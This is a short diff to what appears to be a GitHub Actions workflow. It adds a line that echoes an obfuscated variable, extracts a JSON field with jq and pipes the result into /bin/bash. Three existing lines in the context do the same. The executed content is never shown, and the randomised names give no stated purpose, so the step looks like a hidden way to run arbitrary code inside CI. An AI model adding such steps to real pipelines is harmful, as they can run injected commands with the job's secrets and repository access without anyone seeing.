@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$ep3" | jq -r .dx5825 | /bin/bash
           echo $wlfpg55524 | jq -r .kur46 | /bin/bash
           printf '%s' "$iscl7" | jq -r .qkhyv0324 | /bin/bash
+          echo $febnu80 | jq -r .f165 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
